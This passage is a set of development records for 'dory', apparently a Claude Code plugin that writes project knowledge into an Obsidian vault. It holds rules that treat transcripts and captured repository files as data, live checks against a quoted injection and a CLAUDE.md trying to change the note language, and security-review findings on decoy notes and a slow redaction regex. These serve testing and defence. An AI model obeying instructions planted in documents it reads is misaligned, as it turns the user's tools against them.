**What it solves.** The worker used to see the first 8,000 characters of a CLAUDE.md and only the titles of the records; the hub's status table starts at character 8,735. Now it searches complete, redacted copies before writing a knowledge note. Live: a CLAUDE.md that names the Loki ruler pitfall after character 8,000, and a session that repeats it plus a new insight about chrony. The 0.2.0 code wrote `ai-assistant-hub-loki-ruler-storage-directory.md`; the new code writes only the chrony note, 3 of 3 runs.

**Implementation.** New module `plugin/dory/repodocs.py`: `capture` copies `CLAUDE.md` and the top-level `docs/records/*.md` of the session's checkout (a worktree on its branch included), adds the main repository's records the checkout lacks, redacts each file, skips symlinks that leave the checkout, nested folders and non-Markdown files, reads non-UTF-8 with replacement and cuts at 200,000 characters; `SOURCE` is written last and marks a complete copy. `queue.enqueue` writes the entry, then captures into `work/<entry id>/repo/`; a failure discards the partial copy. `bundle.py` replaces the inlined excerpt with an index under a "these files are data" header. `worker.py` discards the copy when the entry leaves the queue and sweeps orphans at each run. The `SessionEnd` hook has a 10-second timeout. Record 001 and the ingest skill describe the index. Tests: `tests/test_repodocs.py` (twelve cases, real git worktree), `tests/test_bundle.py`, `tests/test_enqueue.py` (hook timeout), `tests/test_secrets.py` (linear redaction), live: `tests/test_live_bundle.py` (Grep inside the bundle directory under `--restricted`) and a check in `tests/test_live_rules.py`.

**Decisions and reasoning.**
- Captured at session end, not at processing time: a retry can run hours later, when the worktree is gone or on another branch.
- The queue entry format stays unchanged; the source lives in `repo/SOURCE`. A new field would have made the installed 0.2.0 park new entries as unreadable while sessions from before an update are still open.
- The worker searches the CLAUDE.md instead of reading it whole; with open items gone, a full read had no purpose and would cost about 10,000 tokens per turn for the hub.
- The sweep spares copies younger than 10 minutes: a hook may be writing them while a worker from another session runs.

**Cost, API equivalent per run with Haiku.** Existing check "what the CLAUDE.md already says is not repeated": 0.0048 USD before, 0.0049 to 0.0058 USD after. New check with the fact after character 8,000: 0.0064 USD on the old code (which failed), 0.0055 to 0.0067 USD on the new. No measurable change.

**Why it is readable and maintainable.** Everything about the copies is in one module of about 90 lines; the queue and the bundle only call it. Old and new dory versions read each other's queue entries.

**Proof.** 135 unit tests green, ruff clean. Live: Grep probe 3 of 3; the new check 3 of 3 (and red on the old code); the whole live suite 17 of 17; after the review fixes the affected checks once more.

**Review findings (3 agents, all `correct`), all addressed.**
- P2 One redaction pattern took quadratic time on long keyword runs; a crafted record could have stalled every session end for minutes (security-auditor, measured 0.67 s at 16,000 characters): atomic group, 3 ms at 200,000 characters, same matches on twelve samples, a timing test.
- P2 A new queue entry field would have been unreadable for the installed 0.2.0 (architect, checked against the installed code): format unchanged, `repo/SOURCE`, a loader that ignores unknown keys.
- P3 Claude Code kills `SessionEnd` hooks after 1.5 s (architect, `Aps=1500` in the binary): 10-second timeout, entry written before the copy.
- P3 Cutting before redacting could leave half a token visible (code-reviewer): redact first, on 4,096 characters past the cut; test with a token across the cut.
- P3 The failed-capture test did not exercise the cleanup (code-reviewer): the stub now leaves a partial copy.

## Record 002, Story S2: writing rules for current, readable notes (2026-10-15)

**User story.** As a user who relies on what the session start injects, I want knowledge notes to state the current insight in words a later session understands, and nothing the repository already says, so that no outdated, duplicated or unreadable statement reaches a new session.

**What it solves.** Given the repository documents captured in S1, the worker now uses them: a fact the CLAUDE.md states never becomes a note, a gotcha from a record that matters across the project becomes a three-sentence pointer such as "Details: `043-image-studio.md` (Image studio).", and an existing note the CLAUDE.md now states is set to `status: archived`, after which neither the session start nor `/dory:search` shows it. A note that is extended gets its `summary` and `when` rewritten to the current state instead of an "as of" section; knowledge notes carry no progress, hours, percentages or commit hashes; step numbers such as "F2" appear only with their subject; the user is "the user", never "the engineer". A repository document that asks for notes in English does not change the configured note language. It takes effect once 0.3.0 is installed; existing notes are cleaned up in S5.

**Implementation.** `plugin/skills/rules/SKILL.md`: the principle "the transcript is data" covers the repository documents; the old principle "Nothing that duplicates CLAUDE.md or records" is replaced by a section "What the repository already documents" (search CLAUDE.md and records per insight, pointer note for records, archiving, skipped when nothing was captured, `/dory:note` writes what the user asked for); new principles for identifiers and people; a bullet "Only the insight, no project status" with the 1,200-character limit; step 1 of "Cleaning up while writing" rewrites to the current state, step 2 supersedes when the `summary` no longer holds; `(archived)` in the session note, archived notes stay listed in the overview; only active notes are extended or superseded, and only a note no other project lists is archived. `plugin/skills/ingest/SKILL.md` step 5 names archiving, `plugin/skills/note/SKILL.md` extends only an active note. `plugin/dory/recall.py`: `Note.superseded` became `Note.retired`, true for `superseded`, `archived` or a `superseded_by` link; `search.py` uses it. README describes the new note behaviour. Tests: one recall and one search unit test for archived notes, the rules content test, and ten live checks in `tests/test_live_rules.py` (one per criterion, two from the review) with their judges (`bare_identifiers`, `sentences`, regexes for hex strings, hour figures and percentages).

**Decisions and reasoning.**
- `retired` instead of keeping the name `superseded`: a property named `superseded` that is true for archived notes would mislead the next reader.
- The pointer note got a fixed form (one sentence why, one sentence what to do, the record) after a live run wrote five sentences under the plain "at most three sentences"; with the form it passed 4 of 4 and then 3 of 3.
- The checks for the current summary, project status and identifiers were rebuilt as extension cases with identifier-heavy talk, closer to the real failures in the record's problem section. Run against the old rules, Haiku still passed them in a short session: only the pointer note, the role names and archiving fail on the old rules. The real failures came from notes extended over many long sessions, which one short live run does not reproduce; the five checks guard the behaviour from regressing.

**Why it is readable and maintainable.** The rules keep one place per concern: the repository check is one section, the status limit one bullet, the current-state rule sits in the extend step it changes. `retired` is the one filter that recall and search share.

**Proof.** 137 unit tests green, ruff clean; the two archived-note tests failed before `retired`. Live with Haiku on the final rules: the ten new checks 3 of 3 rounds each (30 runs), the whole live suite 27 of 27. Before the review, the eight per-criterion checks had passed 3 of 3 on the then rules (24 runs, 0.15 USD, 29 s average). One earlier run of the archiving check failed because the worker ended without writing the session note (70 s, twice the usual cost; in production the entry is retried up to three times); it did not recur in the 114 worker runs after it (154 runs in the whole iteration, 0.90 USD).

**Review findings (3 agents, all `correct`; second pass by the code-reviewer after the fixes).**
- P2 Archiving a note that other projects list hid it from them too, though their sessions never see this CLAUDE.md (architect, security-auditor): only a note no other project lists is archived. Reproduced live before the fix (archived in 2 of 2 runs), fixed 3 of 3, kept as a live check.
- P2 An archived note could be extended with a new angle and stay hidden (architect, security-auditor): only active notes are extended or superseded; a new angle on an archived subject becomes a new note. Reproduced live before the fix (1 of 2), fixed 3 of 3, kept as a live check. `/dory:note` and the ingest steps follow.
- P2 The identifier judge accepted "F2 applies to every tenant", because any four-letter word after the token counted (code-reviewer): it now accepts only a naming word directly before the token or one in brackets after it, stricter than the criterion's wording.
- P2 The feature-detail check ruled out two exact phrases only (code-reviewer): no knowledge note may mention the budget or the SNB rate.
- P3 The status check covered only notes mentioning "deployment", the sentence count only the first pointer note (code-reviewer): both cover every note now.
- P3, second pass: the bracket branch of the identifier judge skipped text inside the bracket, so "F2 (see S3, the redirect)" passed: it now requires a word of four letters directly inside the bracket. The identifier check ran 3 of 3 again with it.
- P3, second pass: the README and Record 002 still said every note the CLAUDE.md states is archived: both name the exception for shared notes now. In the record this changes the solution, the archiving criterion of S2 and the archiving criterion of the vault cleanup (S5): a shared note is archived only when the CLAUDE.md of every project it lists states it.

## Record 002, Story S6: release 0.3.0 prepared (2026-10-15)

**User story.** As a user of the public plugin, I want these changes as version 0.3.0 with a changelog entry, so that `claude plugin update dory@brain` brings them and I can read what changed.

**What it solves.** A user of 0.2.0 reads in one entry what the update changes: the worker sees the repository's CLAUDE.md and records, the session start carries knowledge only, archived notes, the new writing rules, and that existing notes are not rewritten. It is the release the vault cleanup waits for.

**Implementation.** Version 0.3.0 in `pyproject.toml`, `plugin/.claude-plugin/plugin.json` and `plugin/dory/__init__.py`; `uv.lock` follows. A 0.3.0 entry at the top of `CHANGELOG.md`; the CLAUDE.md names 0.3.0 as the current version.

**Decisions and reasoning.**
- 0.3.0, a minor version: below 1.0 a removed setting does not need a major version, and old configs keep loading.
- The entry is written against the code of the branch, not against the record: it names the hook timeout and the queue compatibility with 0.2.0, which the record's story list does not mention.

**Why it is readable and maintainable.** One bullet per change a user notices, in the style of the earlier entries; the writing rules as sub-bullets, because they are one change with several parts.

**Proof.** 137 unit tests green (the version test included), ruff clean. No live checks: worker and rules are unchanged since the last iteration.

**Review findings (2 agents, both `correct`; all in the CHANGELOG text, checked against the code), all fixed.**
- P2 The entry called "what the CLAUDE.md states never becomes a note" a new rule; 0.2.0 already had it for every write, and 0.3.0 exempts `/dory:note` (code-reviewer, architect as P3): the bullet scopes it to the worker, names the exemption and says that 0.2.0 wrote no note on a record's subject.
- P3 Sessions queued by 0.2.0, captures the hook did not finish and entries moved back with `dory retry` run without the documents (code-reviewer, architect): the entry says so.
- P3 The 1,200-character limit applies to the body, not the file (architect): corrected.
- P3 The archiving sentence read like a sweep of the whole vault; it happens only when a session brings up the subject (architect): corrected, with the note that other notes stay as they are.
- Second pass by the code-reviewer over the corrected entry: `correct`, no findings; every statement backed by the code at HEAD.

## Record 002, Story S7: living notes with telling names (2026-10-16)

**User story.** As a user who reads the vault in Obsidian and relies on the session start, I want knowledge notes only for what really matters, named after what they say, and corrected or removed when they go stale, so that the project view shows current insights I can find by their title.

**What it solves.** In the real vault every one of 15 sessions had left knowledge notes, a third of the infrastructure notes only described the code, every name started with the 32-character project prefix, and two notes contradicted each other on how the warning mail is sent. Now a build session without a pitfall ends with its session note only (live: a CSV export with a review fix yields no knowledge note). A new note is called, for example, `The Entra redirect URI must match exactly, trailing slash included`. When Loki moves from port 3100 to 3200, the worker corrects the note in place and dory renames `ai-assistant-hub-loki-port.md` to `Loki runs on port 3200.md` and relinks the overview and the session note. A note the CLAUDE.md now states is deleted and leaves the overview; a note the infrastructure project lists as well stays.

**Implementation.** New module `plugin/dory/vaultops.py`: `apply_marks` carries out the marks after a successful run, `rename_note` (title cleaned of `[ ] # ^ | \ / : * " < > ?`, at most 100 characters, unique case-insensitively across the vault, the project in brackets on a collision; every link form rewritten, in both Unicode forms), `delete_note` (list entries that only link the note go, other links become plain text). `ingest.make_process` calls it once the session note exists; a failure there is logged and never undoes the run; `runs.log` gets `vault_changes`. `Note.holds_knowledge` in `recall.py` is the type check both modules share. Rules: the bar with its negative list and "most sessions yield no knowledge note"; an existing wrong note is always corrected; titles as core statement without project prefix and without a final full stop, links copied exactly; correction in place with `rename_to` instead of superseding; the retire bullet marks for deletion; `## Insights` says corrected or deleted; the template drops `superseded_by`. The ingest and note skills follow (`/dory:note` names notes the same way but neither renames nor deletes). README, CHANGELOG 0.3.0 entry and CLAUDE.md describe it. Tests: `tests/test_vaultops.py` (eight cases), two in `tests/test_ingest.py`, live checks: a build session yields no note, names, correction with rename, deletion, the shared note kept; the check for a new angle on an archived note went, archived notes no longer persist.

**Decisions and reasoning.**
- Decision 6 in Record 002, by the user: the bar, names after the core statement, correction and deletion instead of superseding and archiving ("the second brain lives").
- The worker marks, dory's code acts: the run has no tool to rename or delete, and code checks names, project and type and rewrites links deterministically.
- Deletion only of a note whose `projects` is exactly the session's project, enforced in code as well as in the rules; a marked shared note is set back to `active`, so it does not stay hidden.
- The bar applies to new notes; an existing note the session shows to be wrong is always corrected, because the extension check (translation moved to query time) would otherwise leave a wrong note standing.
- Titles end without a full stop: the first live run linked `…AADSTS50011.]]` to a file without the stop; after the rule rewrite 3 of 3.

**Why it is readable and maintainable.** Everything that changes files outside the model's run is in one module of about 180 lines with a public `apply_marks`, `rename_note` and `delete_note`; the vault cleanup (S5) can use the same functions. The marks are plain frontmatter that a user can read and set by hand.

**Proof.** Before the review: 147 unit tests green, ruff clean; the vault operation tests failed before the module existed. Live with Haiku: the five new or changed checks 3 of 3, the whole live suite 28 of 28; 51 worker runs, 0.28 USD API equivalent. The final numbers after the review fixes are below. Two judge fixes on the way: the deletion check's positive control looked for the literal `loki:3100`, while the note said "service name loki" (now "grafana"); the name check found the dead link with the full stop, which was a real rule gap.

**Review findings (3 agents, all `correct`, no P0 or P1; 11 findings, all fixed, each with a unit test that failed before the fix).**
- P2 A failure midway (an unreadable note, a file removed in Obsidian) lost the log of changes already made and could leave links dangling with no mark left (code-reviewer, architect, security-auditor): links are rewritten before the note is renamed or deleted, each mark runs guarded and logs `failed <path>`, and the mark stays for the next run. The architect proposed skipping an unreadable file instead; that would leave a dead link no later run repairs, so only a file removed since the scan is skipped.
- P2 A run for one project reset another project's deletion mark to active, for example after the marking run had failed (code-reviewer, architect): marks of other projects are left alone; only shared or project-less notes are reactivated.
- P2 Without the project prefix two projects can hold the same file name; a deletion or rename then unlinked or relinked the other note's links, and a decoy note could strip every link to a real note (security-auditor): a mark on a name another file shares is skipped.
- P2 A NUL in `rename_to` or a note that is not valid UTF-8 raised and blocked every later mark (security-auditor): control characters are dropped from titles, and notes are read and written byte-preserving.
- P3 A rename could replace a symlink or a case-variant file such as `Target.MD` (security-auditor): both count as taken.
- P3 The folder name in brackets was not cleaned and the title reached a regex replacement template (security-auditor): cleaned, inserted by a function.
- P3 Links in tables (`[[x\|alias]]`) and embeds (`![[x]]`) of a deleted note were missed or became `!x` (security-auditor, code-reviewer): both forms handled.
- P3 A title starting with a dot is hidden by Obsidian (architect): forbidden in the rules, stripped by `clean_title`.
- P3 The README restore command quoted `~` (all three): fixed.

**Second pass (security-auditor, `correct`, 2 P2 and 1 P3, all fixed).**
- P2 The duplicate-name guard compared names with `casefold`, the link patterns with regex case folding, which equates a dotless `ı` with `i`: a decoy `Lokı port` passed the guard and its deletion stripped the links to another project's `Loki port`. One generic link pattern now finds every link, and a callback rewrites it only when its name equals the target under the same comparison the guard uses.
- P2 The first-pass fix left another project's deletion mark in place, so that project's next run deleted the note whoever wrote the mark. A mark only counts if the run that succeeded wrote it: dory takes the marks before the run, and one that was already there comes from a failed run and is reset. A mark whose execution failed on a file is remembered in `pending-marks.json` in the state directory, where the worker cannot write, and the next run finishes it. This replaces the third patch to the same spot with a rule that says which marks count.
- P3 A failed mark named the note but not the blocking file, and nothing showed it: the line carries the file's path and the run's `error` field, which `dory status` shows.

After the fixes: 159 unit tests green, ruff clean; on the final code the five new live checks 3 of 3, the whole live suite 28 of 28. The iteration took 98 live worker runs, 0.54 USD API equivalent.

**Third pass (security-auditor, `correct`, 1 P2 and 2 P3 in how pending marks are kept, all fixed with a unit test each).**
- P2 A pending entry stayed after its mark was gone (the user reactivated the note), so a later mark at the same path skipped the project check: a retry now needs the mark to have been there before the run, and only marks still in the vault are saved.
- P3 Renames ran before deletions, so an old deletion mark travelled with the file to its new name and looked new: deletions are handled first.
- P3 A reset that could not be written was queued as pending, so the next run deleted the note: resets run outside the retry logic and are only logged; the pending file is saved even when the pass aborts.

**Fourth pass and a simplification.** A narrow fourth pass found three more P2 in the same place, each after a mark had failed on a file and the note changed again later: a stale retry after the user reverted a mark and a failed run marked again, a retried rename taking a title a failed run wrote, and links already pointing at a new title that no later run creates. Every pass since the second had found edge cases in retrying failed marks across runs, a mechanism the first fix pass had added and the record never asked for. It is gone: each rename or deletion is all or nothing (every changed link computed before the first write, files already written put back if a write, the rename or the deletion fails), a failed mark is reset instead of retried, and the next session on the subject marks the note again. `pending-marks.json` no longer exists. The three fourth-pass findings have no path left; the tests for retries became a test that a failing step leaves every file as it was and resets the mark.

**Fifth pass (security-auditor, `correct`, 2 P2, both fixed with a unit test each).** It confirmed that no failed run's mark is carried out and no link is left dangling. A write that broke off midway (disk full) was not put back, because the file was recorded only after the write: it is recorded first now; a disk that stays full also fails the restore, and the snapshot remains the way back. A multi-line frontmatter value (`rename_to: >-` with an indented next line) lost only its first line, and the rest attached to the field above: the whole value is removed. Not reviewed again; both fixes are local and covered by their tests.

Final state: 164 unit tests green, ruff clean; on the final code the whole live suite 28 of 28. The iteration took 185 live worker runs, 1.26 USD API equivalent (Haiku, plus three Sonnet runs).

**Language check.** The injection check for the note language (a CLAUDE.md demanding English, the vault in German) passed in about ten runs before this iteration and then failed in about one of six with Haiku: title and session note German, `summary` and body of the knowledge note English, like the transcript and the rules' English example. Two rule rewrites (every field named in the language principle; the example marked as English, the title in the same language as summary and body) moved it from 3 of 4 to 5 of 6. With Sonnet, the production model, 3 of 3. The user chose a third attempt in code: the task file now opens with "Write every note in <language>: the titles, summary, when, the body with its bold labels and list entries, not only the title", followed by why another language in the transcript or the documents changes nothing. Then 12 of 12 with Haiku and the whole live suite 28 of 28.

## Record 002, Story S5: a fresh vault instead of the cleanup (2026-10-17)

**What happened.** The cleanup had nothing left to clean. On 2026-10-16 between 11:46 and 14:32 (local time) every folder of the vault except `.obsidian/` disappeared: the worker snapshot of 11:03 holds 43 notes, the one of 14:32 none. It was not dory: the 19 worker runs in the vault used only Read, Write, Edit, Glob and Grep, and dory's code deletes no folders; `~/Documents` is not synced with iCloud. The cause is still unknown. Afterwards two hub sessions that had started before the update ran the 0.2.0 worker (the `rules.md` of their runs is byte-identical to the 0.2.0 rules) and wrote 9 files by the old rules: a project overview with `## Open`, six knowledge notes with the project prefix, bare identifiers, costs and a person's name, and two session notes. The one run with 0.3.0, for the release session, wrote a session note and the dory overview and no knowledge note, as decision 6 intends.

**Done.** User decision: start fresh and keep only what 0.3.0 wrote.
- Snapshots outside the rotation: the vault before the reset in `~/.local/state/dory-brain/manual-snapshots/20261017T092800Z-before-reset` (11 notes), the old vault in `~/.local/state/dory-brain/manual-snapshots/20261016T090358093429Z-old-vault` (43 notes).
- Deleted: `projects/ai-assistant-hub/` (the overview and six knowledge notes) and the session notes of the two hub sessions of 2026-10-16, 15:25 and 16:26.
- Kept: `projects/dory/dory.md` and the release session's note.

**Checked.** Every `[[link]]` in the vault resolves. A simulated session start for the hub repository injects only the project line with "(no project overview in the vault yet)". The API key that appeared in a hub session's chat is in neither vault nor bundle; the bundle has `[REDACTED]` in its place.

## Record 003, design: one knowledge file per project (2026-10-19)

**User story.** As the author, I want a reviewed design for 0.4.0, in which the worker keeps one `knowledge.md` per project and in `general/` and `private/`, `/dory:note` writes a separate `notes.md`, and the session start loads both or a summary, so that the build loop works against agreed stories. Foundation work: no behaviour changes yet.

**What it solves.** Two days with a fresh vault showed the knowledge of ai-assistant-hub spread over 13 files (15,470 characters), the rename and delete machinery of 0.3.0 never triggered in 19 runs, and the user's own notes treated like the worker's. Record 003 records six decisions by the user and seven stories with Given-When-Then criteria.

**Implementation.** `docs/records/003-project-knowledge-file.md` (problem, options, decisions 1 to 6, solution, stories S1 to S7); the build loop's state in `docs/auto-state.md`, replacing the finished loop of Record 002; a status row in `CLAUDE.md`.

**Decisions and reasoning.**
- By the user: `knowledge.md` has no size limit (1B); fixed sections, edits and a diff after the run (2B), without a guard that undoes large removals; the worker reads `notes.md` and never changes it (3A); one pair of files per scope with `general/` and `private/`, and `/dory:note` can write general notes from within a project (4B); no migration of 0.3.0 notes (5C); the summary is made by the worker in the background, never at session start (6B).
- Added during the design review, without a separate decision: dory's code owns the frontmatter of `knowledge.md` and a project's domain (`work` by default, private only by hand); notes are kept in the user's words, not translated; notes load before knowledge; one summary per project rather than per scope; `dory add-note` writes notes deterministically and replaces `dory refresh`.

**Review findings (architect review of the record against the code, 19 findings, 3 of them P1), all addressed in the record.**
- P1 A corrected entry gets a new bold lead, so a diff keyed by the lead would have counted every correction as a removal and drowned the loss signal in `dory status`: a vanished entry is paired with a similar new one and counted as changed.
- P1 The rule "domain by content" would have let one session about the user's NAS turn a work project private, so that every later session there loaded `private/`: the code creates the file with `domain: work`, and the post-run checks restore `type`, `domain` and `paths`.
- P1 The 0.3.0 rules send the worker to search the project folder, where existing vaults keep their single notes: only `knowledge.md` and `notes.md` count as current there, other changed files are logged, and a live check covers it.
- P2 Read-only `notes.md` rested on the rules alone (now a permission rule in the worker command plus a restore after the run); partial runs escaped the diff (a baseline from the first attempt); the summary's hash, marking, command and failure handling were unspecified; the worker's input grows with the project (a live check at about 15,000 characters, Grep for `general/` and `private/`); a user note a later session contradicts; link form for files of the same name; placement and wording of `/dory:note`; the search boundary for private projects; missing placement live checks.
- P3 Story S1 split into the deterministic post-run checks (new S1) and the worker (S2); structured `vault_changes`; heading levels and the order when cutting at session start; CHANGELOG notes on restarting old sessions and on sibling-project knowledge.

## Record 003, Story S1: entries and post-run checks (2026-10-19)

**User story.** As a user whose project knowledge a model edits after every session, I want dory to compare each run against the state before it, protect the frontmatter and my notes, and report every removed entry, so that a lost entry shows up in `dory status` instead of going unnoticed. Foundation for S2 (the worker writing `knowledge.md`), whose live checks read these results, and for S6 (search by entry).

**What it solves.** Every worker run is now checked in code: a model that drops an entry, changes a project's domain, rewrites the user's notes or touches a file it has no business with leaves a line in `runs.log`, and `dory status` shows the day's count. A corrected entry with a new bold lead counts as one change, not as a loss. What the worker writes does not change yet: the rules still produce 0.3.0 single notes until S2.

**Implementation.**
- `entries.py`: the parser (an entry is a column-0 bullet up to the next bullet or heading, loose text counts too; key is the normalized bold lead, else the first 80 characters, duplicates numbered) and the diff (same key with other text or section is `changed`; a vanished entry pairs with the most similar new one in the same file from a difflib ratio of 0.5, without autojunk; the rest is `added` or `removed`).
- `baseline.py`: skeletons for missing knowledge files (`type`, `domain` from the folder, `paths` for a project, `updated`); the baseline under `<state>/baselines/<entry>/` (copies of the three knowledge files and every `notes.md`, hashes of every other `.md` in `projects/`, `general/`, `private/`); the checks (protected keys restored, changed `notes.md` restored, unexpected files reported, entry diff), each step guarded so a read or write error becomes a `failed` item.
- `ingest.py`: skeletons, snapshot, baseline right before the run; checks after every outcome that changed the vault or that inherits an unchecked baseline; the snapshot of a transient run is dropped only when the vault did not change. `ops.py`: `Knowledge today: … removed, … restored, … unexpected, … failed checks`. `worker.py`: baselines discarded and swept like the repository copies.

**Decisions and reasoning.**
- The baseline is per attempt, not per entry as Record 003 first said: a baseline kept from the first attempt restored the user's notes and a hand-set `domain` to their state at that attempt, possibly hours earlier, and reported other entries' changes as this entry's (first review pass, P1). Each attempt now reports its own changes; only an attempt that ended before its checks ran (no `CHECKED` marker) hands its baseline on. Record 003 changed accordingly.
- The baseline lives in `<state>/baselines/`, not under `work/<entry>/`, because the run can write its bundle directory.
- `vault_state` ignores `.obsidian/` and `.trash/`: Obsidian writes its workspace file while the vault is open, which would make every run look like a change.
- Known limit, now in the record: a hand edit to a `notes.md` during a run (20 to 60 seconds) is undone and logged as `restored`; `dory add-note` (S5) will write into running baselines so its own notes stay.

**Why readable and maintainable.** One module per concern: `entries.py` knows Markdown entries and nothing about runs, `baseline.py` knows the vault layout and the run's guard, `ingest.py` only wires them in. Tests read as the acceptance criteria (`test_each_attempt_reports_its_own_changes_and_keeps_edits_made_in_between`).

**Review findings.** First pass (architect and code reviewer): P1 baseline kept across attempts undoes user edits (fixed, per-attempt baseline); P2 status counted per-entry last lines, double-counting and missing changes (fixed, sums the day's lines); P2 a dangling link made the baseline raise and every entry fail (fixed, `is_file()` and an `unreadable` marker); P2 difflib autojunk kept entries over 200 characters from pairing, a corrected entry counted as removed (fixed, `autojunk=False`, test with a 250-character entry); P3 failed checks invisible in status (fixed, counted). Second pass (code reviewer, `correct`): P2 a kept baseline was marked checked without a check when the next attempt changed nothing (fixed, checks run when the baseline is inherited); P3 a failure before the run left the baseline unchecked (fixed, taken right before the run, marked checked when `claude` does not start); P3 the skeletons broke two 0.3.0 live checks (fixed, `knowledge.md` excluded from their note count). Each fix has a test that fails on the old code. Not reviewed a third time: the second-pass fixes are local and covered.

**Checked.** 186 unit tests green, ruff clean. No live run: the story is deterministic, and the live suite is ported in S2.

## Record 003, Story S2: the worker keeps one knowledge file per scope (2026-10-19)

**User story.** As a user who reads what dory knows about a project, I want the worker to keep it in one `knowledge.md` per project, and in `general/` and `private/`, growing and shrinking with what holds, so that I read the project's knowledge as one text and nothing outdated stays in it. End-user value: what the worker writes is now the 0.4.0 model; the session start reads it from S3 on.

**What it solves.** A session no longer leaves single notes. The worker adds, extends, corrects or removes bullet entries in fixed sections of one file per scope, never touches the user's `notes.md` (a permission rule, checked live) or files of 0.3.0, and puts what applies everywhere into `general/` or, when private, `private/`. On a file of 40 entries and 14,095 characters, a run added one entry and lost none, with Haiku (0.006 USD, 20 s) and Sonnet (0.088 USD, 35 s).

**Implementation.**
- `plugin/skills/rules/SKILL.md` rewritten for knowledge files: sections, bold-lead entries with at most three sentences, which file (project, `general/`, `private/`, never another project's, never `general/` from a private project), Edit instead of Write, the user's notes read-only and never repeated, a contradicted note named under `## Open`, path links with alias, the `## Insights` line format. Kept from 0.3.0: data principle, commands from the user's hand, no secrets, language, the bar, the repository check with record pointers, identifiers with their subject, people.
- `plugin/skills/ingest/SKILL.md`: read the project's knowledge and notes in full, Grep `general/` and `private/`, no overview step.
- `ingest.py`: the task lists the knowledge files the run may change and the notes it must leave alone, the session note links the project's `knowledge.md`, no overview and no known projects; the `--settings` of the run deny Edit and Write on `**/notes.md`; skeletons first, then the domain, then the files. `scopes.py` (new): layout, `knowledge_files(project, domain)`, `project_domain` (the project's `knowledge.md`, before it exists a 0.3.0 overview). `bundle.py` names that domain. `vaultops.py` and its tests removed.
- `entries.py`: a lead counts for pairing only when the new lead keeps every word of the old one except numbers. `ops.py`: `dory status` also counts rewritten leads. `baseline.py`: a kept baseline remembers the files it captured.

**Decisions and reasoning.**
- The deny rule stays in the command: the live probe showed a restricted run honours it (3 of 3), and that the Edit rule alone also blocks Write; both rules are listed for clarity.
- A changed entry whose lead was rewritten is counted in `dory status` as a rewritten lead: short entries built on one pattern ("Loki runs on port 3100", "Redis runs on port 6379") pair by their whole text, and no rule tells such a pair from a correction without false removals; counting them keeps a wrong pairing visible.
- A 0.3.0 overview's `domain: private` seeds the project's domain once (one key, an exception to decision 5): otherwise a project the user had marked private would silently become work, and its knowledge would be searchable from work projects.
- Two failures in the first 3-of-3 rounds changed the code: the port correction counted as a removal (pairing by lead added, then restricted), and Haiku once repeated a user note as an entry (the task and the ingest skill now say that nothing the notes say becomes an entry); both checks then passed 3 of 3, twice.

**Live tests.** New: the permission probe (`tests/test_live_bundle.py`), a full file keeps every entry, a user's note is never changed or repeated, a contradicted note is named as open, knowledge lands in its scope, files of an earlier version stay untouched. Rewritten for the new model: build session adds no entry, a pitfall becomes an entry that opens with its statement, contradicting insight corrects the entry, the entry the CLAUDE.md now states is removed. Ported: same insight extends, CLAUDE.md facts (also after 8,000 characters) not repeated, extending rewrites to the current state, record detail gets no entry, platform gotcha becomes a pointer, session note keeps what is open, shopping list, quoted injection, configured language, repository documents cannot change the language, identifiers with their subject, no project status, no role names. Dropped: an insight for two projects lists both, the overview loses its open section, a note shared with another project is kept (no multi-project notes and no overview any more). `tests/test_live_note.py` is skipped until `/dory:note` moves to `notes.md`.

**Review findings.** First pass (architect, code reviewer, security auditor, all `correct`): P2 lead pairing paired unrelated entries and hid removals (restricted, rewritten leads counted); P2 a 0.3.0 private project became work (domain seeded from the overview); P2 a private project's session could write `general/` (left out of its files, reported as unexpected, rule added); P2 the note-repeat check keyed on the user's verb (checks content now); P3 NAS check, bundle domain line test. Second pass (code reviewer, `correct`): P2 the bundle still said work on the first run of a 0.3.0 private project (the overview fallback moved into `project_domain`); P3 a kept baseline could be checked against another set of files after a domain change (the captured list is stored); P3 the rules said "three files". Each fix has a test that fails on the old code; not reviewed a third time, the second-pass fixes are local.

**Checked.** 170 unit tests green, ruff clean; whole live suite 25 of 25 on the end state (6 note checks skipped), every new check 3 of 3 with Haiku. The iteration took 103 live worker runs and about ten probe runs, 0.59 USD API equivalent.

## Record 003, Story S3: the session start loads the files (2026-10-19)

**User story.** As a user starting a session in a project, I want the session start to load the project's and the general `notes.md` and `knowledge.md` as they are, while they fit the limit, so that Claude knows what the vault knows about the project, not only summaries and paths. End-user value: what S2's worker writes now reaches every new session.

**What it solves.** A session in a work project starts with the project line and the full text of four files, in this order: the project's notes and knowledge, then the general notes and knowledge. Each file sits under its vault path, and its own `## Pitfalls` becomes `### Pitfalls`. A private project and a session outside a repository also get `private/`. A repository dory does not know yet gets `general/`. Single notes and overviews from 0.3.0 no longer appear. When everything together exceeds `recall_budget_tokens`, the files are cut line by line in load order, followed by a marker and the paths of all files. The session start no longer walks the vault: it reads at most six files and the frontmatter of `notes/*.md`.

**Implementation.**
- `scopes.context_files(project, domain)`: the load table of Record 003 as vault-relative paths, notes before knowledge.
- `context.py` (new): `file_texts` (body without frontmatter, headings one level down outside code fences, empty files left out) and `text` (each file under its path). The worker builds the same text in S4 for the summary and its hash.
- `recall.py` rewritten: header, project line (the `summary` of the project's `knowledge.md`, or "no knowledge for this project in the vault yet"), queue lines as before, the files, the paths of lists and registers by domain. Within the limit the text loads as it is. Over the limit, `_cut` gives the header, the project line, the queue lines and the paths their room first, and the files fill what is left. The cut stops at the first line that does not fit, and nothing later fills the gap. The summary of S4 goes between the limit check and `_cut`.
- `search.py` takes `Note`, `scan`, `allowed` and the overview-based `project_domain` from the old recall unchanged, until S6 rewrites it.
- Tests: `tests/test_recall.py` replaced (15 tests: the six criteria, the domain fallback, list visibility, robustness, plus the kept checks for resume, session files, the unknown repository and speed); `tests/test_recall_knowledge.py` removed, it tested ranking and catalog of 0.3.0 notes.

**Decisions and reasoning.**
- The domain of a project whose `knowledge.md` does not exist yet comes from `scopes.project_domain`, which falls back to a 0.3.0 overview's `domain: private`, the same domain the worker's skeleton takes. Record 003 said `work` when the file is missing. The record now says what the code does, so a private project does not lose `private/` at session start until its first 0.4.0 run.
- Over the limit, the pointers (project line, queue lines, file paths, list paths) get room before the file contents, although they appear after them. They make the rest reachable. The catalog reserve of 0.3.0 followed the same reasoning.
- The cut drops a heading the cut left at the end of a block, so no section heading appears without content.

